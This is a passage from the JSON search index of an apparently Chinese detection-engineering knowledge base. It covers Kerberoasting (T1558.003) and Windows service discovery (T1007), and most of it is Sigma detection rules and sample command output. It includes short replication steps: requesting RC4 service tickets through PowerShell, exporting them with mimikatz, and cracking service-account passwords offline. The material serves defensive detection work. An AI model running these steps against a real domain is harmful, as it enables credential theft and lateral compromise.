\u8bc6\u522b\u76ee\u6807\u540e\uff0c\u5229\u7528piwehsell\u811a\u672c\u8bf7\u6c42\u6b64\u670d\u52a1\u4e3b\u4f53\u540d\u79f0\uff08SPN\uff09\u7684\u670d\u52a1\u7968\u636e\uff1b\u8bf7\u6ce8\u610f\uff0c\u8bf7\u6c42\u7684\u670d\u52a1\u7968\u8bc1\u662f\u5177\u6709RC4\u52a0\u5bc6\u7c7b\u578b \u4e00\u65e6\u5ba2\u6237\u7aef\u63a5\u6536\u5230\u7968\u636e\u4ee5\u540e\uff0c\u53ef\u4ee5\u5229\u7528mimikatz\u6216\u5176\u4ed6\u5de5\u5177\u5728\u7528\u6237\u7684\u5185\u5b58\u4e2d\u5bfc\u51fa\u6240\u6709kerberos\u7968\u8bc1\uff1b\uff08\u4e0d\u6d89\u53ca\u6743\u9650\u63d0\u5347\uff09 \u6700\u540e\uff0c\u5c06\u7968\u636e\u5bfc\u51fa\u540e\uff0c\u5c06\u7968\u636e\u6587\u4ef6\u62f7\u8d1d\u5230\u6b63\u5728\u8fd0\u884ckerberoast\u7684kali linux\u4e3b\u673a\uff08\u6216\u5176\u4ed6\u4e3b\u673a\uff09\u3002\u5229\u7528wordlist\u5bc6\u7801\u5b57\u5178\uff0c\u53ef\u4ee5\u8fdb\u884c\u7834\u89e3\u4e0e\u7968\u636e\u76f8\u5173\u7684\u670d\u52a1\u8d26\u6237\u5bc6\u7801\u3002 \u6ce8\u610f\uff1a\u83b7\u5f97\u670d\u52a1\u7968\u636e\u4e0d\u9700\u8981\u63d0\u9ad8\u6743\u9650\uff0c\u4e5f\u4e0d\u4f1a\u5411\u76ee\u6807\u53d1\u9001\u4efb\u4f55\u6d41\u91cf\u3002","title":"SPN\u653b\u51fb\u539f\u7406"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1558-003-win-SPN-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_2","text":"windows \u5b89\u5168\u65e5\u5fd7 Netflow\u6d41\u91cf","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1558-003-win-SPN-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_3","text":"","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1558-003-win-SPN-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_4","text":"windows server 2012\u57df\u63a7 \u9700\u5b89\u88c5powershell AD\u6a21\u5757 windows server 2016\u88ab\u63a7\u4e3b\u673a \u9700\u5b89\u88c5powershell AD\u6a21\u5757 \u5177\u4f53\u53ef\u53c2\u8003\uff1a https://zhuanlan.zhihu.com/p/25942591","title":"\u6d4b\u8bd5\u73af\u5883\u51c6\u5907"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1558-003-win-SPN-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_5","text":"1.\u5b89\u88c5powershell AD\u6a21\u5757 PS >Import-Module ServerManager ; Add-WindowsFeature RSAT-AD-PowerShell 2.\u67e5\u8be2\u5f53\u524d\u57df\u5185SPN\u670d\u52a1 setspn.exe -q */* 3.\u8bf7\u6c42\u6307\u5b9a\u7684TGS $SPNName = 'MSSQLSvc/DC1.test.com' Add-Type -AssemblyNAme System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName 4.\u6267\u884c\u540e\u8f93\u5165klist\u67e5\u770b\u5185\u5b58\u4e2d\u7684\u7968\u636e\uff0c\u53ef\u627e\u5230\u83b7\u5f97\u7684TGS. 5.\u4f7f\u7528mimikatz kerberos::list /export","title":"\u6d4b\u8bd5\u8fc7\u7a0b"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1558-003-win-SPN-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_6","text":"windows \u5b89\u5168\u65e5\u5fd74769 Netflow \u52a0\u5bc6\u65b9\u5f0f\u3001\u670d\u52a1\u540d\u79f0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1558-003-win-SPN-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_7","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1558-003-win-SPN-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#sigma","text":"title: SPN\u670d\u52a1\u626b\u63cf\u871c\u7f50\u8d26\u6237 description: 0day.org\u6a21\u62df\u6d4b\u8bd5\u7ed3\u679c references: https://adsecurity.org/?p=3458 tags: T1558-003 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection: EventID: 4769 #\u5df2\u8bf7\u6c42 Kerberos \u670d\u52a1\u7968\u8bc1\u3002 ServiceName: abcc #\u670d\u52a1\u4fe1\u606f>\u670d\u52a1\u540d\u79f0\uff08\u871c\u7f50\u8d26\u6237\u7528\u6237\uff09 Clientaddress: ::ffff:* #\u7f51\u7edc\u4fe1\u606f>\u5ba2\u6237\u7aef\u5730\u5740 Ticketoptions: 0x40810000 #\u9644\u52a0\u4fe1\u606f>\u7968\u8bc1\u4fe1\u606f Ticketencryptiontype: 0x17 #\u9644\u52a0\u4fe1\u606f>\u7968\u8bc1\u52a0\u5bc6\u7c7b\u578b condition: selection level: medium","title":"sigma\u89c4\u5219"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1558-003-win-SPN-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_8","text":"\u6ce8\u610f\uff1a\u6b64\u89c4\u5219\u65e0\u6cd5\u76f4\u63a5\u5229\u7528\uff0c\u4ec5\u63d0\u4f9b\u68c0\u6d4b\u601d\u8def\u3002\u9700\u8981\u57df\u5185\u5185\u7f6e\u871c\u7f50\u8d26\u6237\u7528\u6237\uff0c\u5f53\u653b\u51fb\u8005\u5bf9\u871c\u7f50\u8d26\u6237\u53d1\u8d77\u626b\u63cf\u3001\u8bf7\u6c42TGS\u65f6\uff0c\u6b64\u89c4\u5219\u53ef\u88ab\u89e6\u53d1\u3002","title":"\u5efa\u8bae"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1558-003-win-SPN-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_9","text":"MITRE-ATT&CK-T1558-003 https://attack.mitre.org/techniques/T1558/003 SPN\u626b\u63cfSQL\u670d\u52a1\u4e3b\u4f53\u811a\u672c https://github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Discover-PSMSSQLServers powershell\u63a2\u6d4b\u811a\u672c https://github.com/PyroTek3/PowerShell-AD-Recon Active Directory\u4e2d\u83b7\u53d6\u57df\u7ba1\u7406\u5458\u6743\u9650\u7684\u653b\u51fb\u65b9\u6cd5 https://www.cnblogs.com/backlion/p/7159296.html \u4f7f\u7528KERBEROASTING\u63d0\u53d6\u670d\u52a1\u5e10\u6237\u5bc6\u7801 https://blog.stealthbits.com/extracting-service-account-passwords-with-kerberoasting/ Active Directory\u4e2d\u670d\u52a1\u4e3b\u4f53\u540d\u79f0\u7684\u8bf4\u660e https://thebackroomtech.com/2018/08/21/explanation-of-service-principal-names-in-active-directory/ \u68c0\u6d4bKerberoasting\u6d3b\u52a8 https://adsecurity.org/?p=3458 \u68c0\u6d4bKerberoasting\u6d3b\u52a8\u7b2c2\u90e8\u5206 https://adsecurity.org/?p=3513 Active Directory PowerShell\u6a21\u5757\u6536\u96c6AD\u4fe1\u606f https://www.cnblogs.com/backlion/p/9267100.html","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1558-003-win-kerberosing/","text":"T1558-003-win-kerberosing \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u670d\u52a1\u4e3b\u4f53\u540d\u79f0\uff08SPN\uff09\u7528\u4e8e\u552f\u4e00\u6807\u8bc6Windows\u670d\u52a1\u7684\u6bcf\u4e2a\u5b9e\u4f8b\u3002\u4e3a\u4e86\u542f\u7528\u8eab\u4efd\u9a8c\u8bc1\uff0cKerberos\u8981\u6c42SPN\u4e0e\u81f3\u5c11\u4e00\u4e2a\u670d\u52a1\u767b\u5f55\u5e10\u6237\uff08\u4e13\u95e8\u7528\u4e8e\u8fd0\u884c\u670d\u52a1\u7684\u5e10\u6237\uff09\u76f8\u5173\u3002 \u62e5\u6709\u6709\u6548\u7684Kerberos\u7968\u8bc1\u6388\u4e88\u7968\u8bc1\uff08TGT\uff09\u7684\u653b\u51fb\u8005\u53ef\u4ee5\u5411\u57df\u63a7\u5236\u5668\uff08DC\uff09\u8bf7\u6c42\u4efb\u4f55SPN\u7684\u4e00\u4e2a\u6216\u591a\u4e2aKerberos\u7968\u8bc1\u6388\u4e88\u670d\u52a1\uff08TGS\uff09\u670d\u52a1\u7968\u8bc1\u3002\u53ef\u4ee5\u4f7f\u7528RC4\u7b97\u6cd5\u5bf9\u8fd9\u4e9b\u7968\u8bc1\u7684\u4e00\u90e8\u5206\u8fdb\u884c\u52a0\u5bc6\uff0c\u8fd9\u610f\u5473\u7740\u4e0eSPN\u76f8\u5173\u8054\u7684\u670d\u52a1\u5e10\u6237\u7684Kerberos 5 TGS\u200b\u200b-REP etype 23\u54c8\u5e0c\u5c06\u7528\u4f5c\u79c1\u94a5\uff0c\u56e0\u6b64\u5bb9\u6613\u53d7\u5230\u79bb\u7ebf\u66b4\u529b\u7834\u89e3\u653b\u51fb\u53ef\u80fd\u66b4\u9732\u660e\u6587\u51ed\u636e\u7684\u653b\u51fb\u3002 \u53ef\u4ee5\u4f7f\u7528\u4ece\u7f51\u7edc\u6d41\u91cf\u4e2d\u6355\u83b7\u7684\u670d\u52a1\u7968\u8bc1\u6267\u884c\u76f8\u540c\u7684\u653b\u51fb\u3002 \u6d4b\u8bd5\u6848\u4f8b PowerSploit Empire \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7 netflow\u6d41\u91cf \u6d4b\u8bd5\u590d\u73b0 \u6682\u65e0 \u6d4b\u8bd5\u7559\u75d5 \u6682\u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: kerberos \u5f31\u52a0\u5bc6 description: \u57df\u73af\u5883\u6d4b\u8bd5 references: https://adsecurity.org/?p=3458 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection: EventID: 4769 #kerberos\u670d\u52a1\u7968\u8bc1\u8bf7\u6c42 TicketOptions: 0x40810000 #\u9644\u52a0\u4fe1\u606f>\u7968\u8bc1\u9009\u9879 TicketEncryptiontype: 0x17 #\u9644\u52a0\u4fe1\u606f>\u7968\u8bc1\u52a0\u5bc6\u7c7b\u578b reduction: - ServiceName: '$*' #\u670d\u52a1\u540d\u79f0>\u670d\u52a1\u4fe1\u606f condition: selection and not reduction level: medium \u5efa\u8bae \u6682\u65e0 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1558-003 https://attack.mitre.org/techniques/T1558/003 \u68c0\u6d4bkerberosing\u6d3b\u52a8 https://adsecurity.org/?p=3458","title":"T1558-003-win-kerberosing"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1558-003-win-kerberosing/#t1558-003-win-kerberosing","text":"","title":"T1558-003-win-kerberosing"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1558-003-win-kerberosing/#attck","text":"\u670d\u52a1\u4e3b\u4f53\u540d\u79f0\uff08SPN\uff09\u7528\u4e8e\u552f\u4e00\u6807\u8bc6Windows\u670d\u52a1\u7684\u6bcf\u4e2a\u5b9e\u4f8b\u3002\u4e3a\u4e86\u542f\u7528\u8eab\u4efd\u9a8c\u8bc1\uff0cKerberos\u8981\u6c42SPN\u4e0e\u81f3\u5c11\u4e00\u4e2a\u670d\u52a1\u767b\u5f55\u5e10\u6237\uff08\u4e13\u95e8\u7528\u4e8e\u8fd0\u884c\u670d\u52a1\u7684\u5e10\u6237\uff09\u76f8\u5173\u3002 \u62e5\u6709\u6709\u6548\u7684Kerberos\u7968\u8bc1\u6388\u4e88\u7968\u8bc1\uff08TGT\uff09\u7684\u653b\u51fb\u8005\u53ef\u4ee5\u5411\u57df\u63a7\u5236\u5668\uff08DC\uff09\u8bf7\u6c42\u4efb\u4f55SPN\u7684\u4e00\u4e2a\u6216\u591a\u4e2aKerberos\u7968\u8bc1\u6388\u4e88\u670d\u52a1\uff08TGS\uff09\u670d\u52a1\u7968\u8bc1\u3002\u53ef\u4ee5\u4f7f\u7528RC4\u7b97\u6cd5\u5bf9\u8fd9\u4e9b\u7968\u8bc1\u7684\u4e00\u90e8\u5206\u8fdb\u884c\u52a0\u5bc6\uff0c\u8fd9\u610f\u5473\u7740\u4e0eSPN\u76f8\u5173\u8054\u7684\u670d\u52a1\u5e10\u6237\u7684Kerberos 5 TGS\u200b\u200b-REP etype 23\u54c8\u5e0c\u5c06\u7528\u4f5c\u79c1\u94a5\uff0c\u56e0\u6b64\u5bb9\u6613\u53d7\u5230\u79bb\u7ebf\u66b4\u529b\u7834\u89e3\u653b\u51fb\u53ef\u80fd\u66b4\u9732\u660e\u6587\u51ed\u636e\u7684\u653b\u51fb\u3002 \u53ef\u4ee5\u4f7f\u7528\u4ece\u7f51\u7edc\u6d41\u91cf\u4e2d\u6355\u83b7\u7684\u670d\u52a1\u7968\u8bc1\u6267\u884c\u76f8\u540c\u7684\u653b\u51fb\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1558-003-win-kerberosing/#_1","text":"PowerSploit Empire","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1558-003-win-kerberosing/#_2","text":"windows \u5b89\u5168\u65e5\u5fd7 netflow\u6d41\u91cf","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1558-003-win-kerberosing/#_3","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1558-003-win-kerberosing/#_4","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1558-003-win-kerberosing/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1558-003-win-kerberosing/#sigma","text":"title: kerberos \u5f31\u52a0\u5bc6 description: \u57df\u73af\u5883\u6d4b\u8bd5 references: https://adsecurity.org/?p=3458 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection: EventID: 4769 #kerberos\u670d\u52a1\u7968\u8bc1\u8bf7\u6c42 TicketOptions: 0x40810000 #\u9644\u52a0\u4fe1\u606f>\u7968\u8bc1\u9009\u9879 TicketEncryptiontype: 0x17 #\u9644\u52a0\u4fe1\u606f>\u7968\u8bc1\u52a0\u5bc6\u7c7b\u578b reduction: - ServiceName: '$*' #\u670d\u52a1\u540d\u79f0>\u670d\u52a1\u4fe1\u606f condition: selection and not reduction level: medium","title":"sigma\u89c4\u5219"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1558-003-win-kerberosing/#_6","text":"\u6682\u65e0","title":"\u5efa\u8bae"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1558-003-win-kerberosing/#_7","text":"MITRE-ATT&CK-T1558-003 https://attack.mitre.org/techniques/T1558/003 \u68c0\u6d4bkerberosing\u6d3b\u52a8 https://adsecurity.org/?p=3458","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1007-win-%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0/","text":"T1007-\u7cfb\u7edf\u670d\u52a1\u53d1\u73b0 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c1d\u8bd5\u83b7\u53d6\u6709\u5173\u6ce8\u518c\u670d\u52a1\u7684\u4fe1\u606f\u3002\u53ef\u4ee5\u4f7f\u7528\u64cd\u4f5c\u7cfb\u7edf\u7a0b\u5e8f\u83b7\u53d6\u6709\u5173\u670d\u52a1\u7684\u4fe1\u606f\u7684\u547d\u4ee4\u662f\u201csc\u201d\uff0c\u4f7f\u7528Tasklist\u7684\u201c tasklist /svc\u201d \u548c\u4f7f\u7528Net\u547d\u4ee4\u7684\u201cnet start\u201d \uff0c\u4f46\u662f\u653b\u51fb\u8005\u4e5f\u53ef\u4ee5\u4f7f\u7528\u5176\u4ed6\u5de5\u5177\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u81ea\u52a8\u53d1\u73b0\u8fc7\u7a0b\u4e2d\u4f7f\u7528\u201c \u7cfb\u7edf\u670d\u52a1\u53d1\u73b0\u201d\u4e2d\u7684\u4fe1\u606f\u6765\u51b3\u5b9a\u540e\u7eed\u884c\u52a8\u8be5\u5982\u4f55\u5f00\u5c55\uff0c\u5305\u62ec\u653b\u51fb\u8005\u662f\u5426\u5b8c\u5168\u611f\u67d3\u76ee\u6807\u6216\u5c1d\u8bd5\u6267\u884c\u7279\u5b9a\u64cd\u4f5c\u3002 \u6d4b\u8bd5\u6848\u4f8b windows\u4e0b\u6267\u884csc\u76f8\u5173\u547d\u4ee4\u3001tasklist /svc\u3001net start \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 C:\\Windows\\system32>sc query SERVICE_NAME: BFE DISPLAY_NAME: Base Filtering Engine TYPE : 20 WIN32_SHARE_PROCESS STATE : 4 RUNNING (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN) WIN32_EXIT_CODE : 0 (0x0) SERVICE_EXIT_CODE : 0 (0x0) CHECKPOINT : 0x0 WAIT_HINT : 0x0 C:\\Windows\\system32>tasklist /svc \u6620\u50cf\u540d\u79f0 PID \u670d\u52a1 ========================= ======== ============================================ System Idle Process 0 \u6682\u7f3a System 4 \u6682\u7f3a smss.exe 288 \u6682\u7f3a csrss.exe 420 \u6682\u7f3a csrss.exe 532 \u6682\u7f3a wininit.exe 576 \u6682\u7f3a winlogon.exe 584 \u6682\u7f3a services.exe 664 \u6682\u7f3a C:\\Windows\\system32>net start \u5df2\u7ecf\u542f\u52a8\u4ee5\u4e0b Windows \u670d\u52a1: Background Tasks Infrastructure Service Base Filtering Engine CDPUserSvc_11e76e Certificate Propagation CNG Key Isolation COM+ Event System COM+ System Application \u6d4b\u8bd5\u7559\u75d5 windows \u5b89\u5168\u65e5\u5fd7\u3001\u8fdb\u7a0b\u521b\u5efa\u3001\u8fdb\u7a0b\u5173\u95ed\u3001\u547d\u4ee4\u884c\u53c2\u6570\u7b49 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: windows \u7cfb\u7edf\u670d\u52a1\u53d1\u73b0 description: windows server 2016 references: tags: T1007 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection: EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\u3002 Newprocessname: 'C:\\Windows\\System32\\sc.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u65b0\u8fdb\u7a0b\u540d\u79f0 Creatorprocessname: 'C:\\windows\\system32\\cmd.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0 Processcommandline: SC * #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u547d\u4ee4\u884c condition: selection level: medium title: windows \u7cfb\u7edf\u670d\u52a1\u53d1\u73b0 description: windows server 2016 references: tags: T1007 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection1: EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\u3002 Newprocessname: 'C:\\Windows\\System32\\tasklist.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u65b0\u8fdb\u7a0b\u540d\u79f0 Creatorprocessname: 'C:\\Windows\\System32\\cmd.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0 Processcommandline: tasklist * #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u547d\u4ee4\u884c selection2: # *5 EventID: 4703 #\u4e00\u4e2a\u7528\u6237\u7684\u6743\u9650\u88ab\u8c03\u6574\u3002 ProcessName: 'C:\\Windows\\System32\\whoami.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u540d EnabledPrivileges: 'SeDebugPrivilege' #\u542f\u7528\u7684\u6743\u9650 selection3: EventID: 4690 #\u8bd5\u56fe\u5c06\u53e5\u67c4\u590d\u5236\u5230\u5bf9\u8c61\u3002 selection4: EventID: 4658 #\u5df2\u5173\u95ed\u5230\u5bf9\u8c61\u7684\u53e5\u67c4\u3002 ProcessName: 'C:\\Windows\\System32\\wbem\\WmiPrvSE.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u540d selection5: EventID: 4656 #\u5df2\u8bf7\u6c42\u5230\u5bf9\u8c61\u7684\u53e5\u67c4\u3002 Objectname: '\\Device\\HarddiskVolume4\\Windows\\System32\\lsass.exe' #\u5bf9\u8c61>\u5bf9\u8c61\u540d ProcessName: 'C:\\Windows\\System32\\wbem\\WmiPrvSE.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u540d selection6: EventID: 4633 #\u8bd5\u56fe\u8bbf\u95ee\u5bf9\u8c61\u3002 Objectname: '\\Device\\HarddiskVolume4\\Windows\\System32\\lsass.exe' #\u5bf9\u8c61>\u5bf9\u8c61\u540d ProcessName: 'C:\\Windows\\System32\\wbem\\WmiPrvSE.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u540d Access: \u8bfb\u53d6\u8fdb\u7a0b\u5185\u5b58 #\u8bbf\u95ee\u8bf7\u6c42\u4fe1\u606f>\u8bbf\u95ee selection7: EventID: 4658 #\u5df2\u5173\u95ed\u5230\u5bf9\u8c61\u7684\u53e5\u67c4\u3002 ProcessName: 'C:\\Windows\\System32\\wbem\\WmiPrvSE.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u540d selection8: EventID: 4689 #\u5df2\u9000\u51fa\u8fdb\u7a0b ProcessName: 'C:\\Windows\\System32\\tasklist.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u540d Exitstatus: 0x0 #\u8fdb\u7a0b\u4fe1\u606f>\u9000\u51fa\u72b6\u6001 timeframe: last 1m #\u53ef\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u8c03\u6574 condition: all of them level: medium title: windows \u7cfb\u7edf\u670d\u52a1\u53d1\u73b0 description: windows server 2016 references: tags: T1007 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection1: EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\u3002 Newprocessname: 'C:\\Windows\\System32\\net.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u65b0\u8fdb\u7a0b\u540d\u79f0 Creatorprocessname: 'C:\\windows\\system32\\cmd.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0 Processcommandline: net start #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u547d\u4ee4\u884c selection2: EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\u3002 Newprocessname: 'C:\\Windows\\System32\\net1.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u65b0\u8fdb\u7a0b\u540d\u79f0 Creatorprocessname: 'C:\\Windows\\System32\\net.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0 Processcommandline: C:\\Windows\\system32\\net1 start #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u547d\u4ee4\u884c selection3: EventID: 4689 #\u5df2\u9000\u51fa\u8fdb\u7a0b ProcessName: 'C:\\Windows\\System32\\net1.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u540d selection4: EventID: 4689 #\u5df2\u9000\u51fa\u8fdb\u7a0b ProcessName: 'C:\\Windows\\System32\\net.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u540d timeframe: last 1m #\u53ef\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u8c03\u6574 condition: all of them level: medium \u5efa\u8bae \u7cfb\u7edf\u670d\u52a1\u53d1\u73b0\u65b9\u6cd5\u6709\u5f88\u591a\uff0c\u4e0d\u80fd\u4e00\u4e00\u5217\u4e3e\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1007 https://attack.mitre.org/techniques/T1007/","title":"T1007-\u7cfb\u7edf\u670d\u52a1\u53d1\u73b0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1007-win-%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0/#t1007-","text":"","title":"T1007-\u7cfb\u7edf\u670d\u52a1\u53d1\u73b0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1007-win-%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c1d\u8bd5\u83b7\u53d6\u6709\u5173\u6ce8\u518c\u670d\u52a1\u7684\u4fe1\u606f\u3002\u53ef\u4ee5\u4f7f\u7528\u64cd\u4f5c\u7cfb\u7edf\u7a0b\u5e8f\u83b7\u53d6\u6709\u5173\u670d\u52a1\u7684\u4fe1\u606f\u7684\u547d\u4ee4\u662f\u201csc\u201d\uff0c\u4f7f\u7528Tasklist\u7684\u201c tasklist /svc\u201d \u548c\u4f7f\u7528Net\u547d\u4ee4\u7684\u201cnet start\u201d \uff0c\u4f46\u662f\u653b\u51fb\u8005\u4e5f\u53ef\u4ee5\u4f7f\u7528\u5176\u4ed6\u5de5\u5177\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u81ea\u52a8\u53d1\u73b0\u8fc7\u7a0b\u4e2d\u4f7f\u7528\u201c \u7cfb\u7edf\u670d\u52a1\u53d1\u73b0\u201d\u4e2d\u7684\u4fe1\u606f\u6765\u51b3\u5b9a\u540e\u7eed\u884c\u52a8\u8be5\u5982\u4f55\u5f00\u5c55\uff0c\u5305\u62ec\u653b\u51fb\u8005\u662f\u5426\u5b8c\u5168\u611f\u67d3\u76ee\u6807\u6216\u5c1d\u8bd5\u6267\u884c\u7279\u5b9a\u64cd\u4f5c\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1007-win-%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0/#_1","text":"windows\u4e0b\u6267\u884csc\u76f8\u5173\u547d\u4ee4\u3001tasklist /svc\u3001net start","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1007-win-%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0/#_2","text":"windows \u5b89\u5168\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1007-win-%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0/#_3","text":"C:\\Windows\\system32>sc query SERVICE_NAME: BFE DISPLAY_NAME: Base Filtering Engine TYPE : 20 WIN32_SHARE_PROCESS STATE : 4 RUNNING (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN) WIN32_EXIT_CODE : 0 (0x0) SERVICE_EXIT_CODE : 0 (0x0) CHECKPOINT : 0x0 WAIT_HINT : 0x0 C:\\Windows\\system32>tasklist /svc \u6620\u50cf\u540d\u79f0 PID \u670d\u52a1 ========================= ======== ============================================ System Idle Process 0 \u6682\u7f3a System 4 \u6682\u7f3a smss.exe 288 \u6682\u7f3a csrss.exe 420 \u6682\u7f3a csrss.exe 532 \u6682\u7f3a wininit.exe 576 \u6682\u7f3a winlogon.exe 584 \u6682\u7f3a services.exe 664 \u6682\u7f3a C:\\Windows\\system32>net start \u5df2\u7ecf\u542f\u52a8\u4ee5\u4e0b Windows \u670d\u52a1: Background Tasks Infrastructure Service Base Filtering Engine CDPUserSvc_11e76e Certificate Propagation CNG Key Isolation COM+ Event System COM+ System 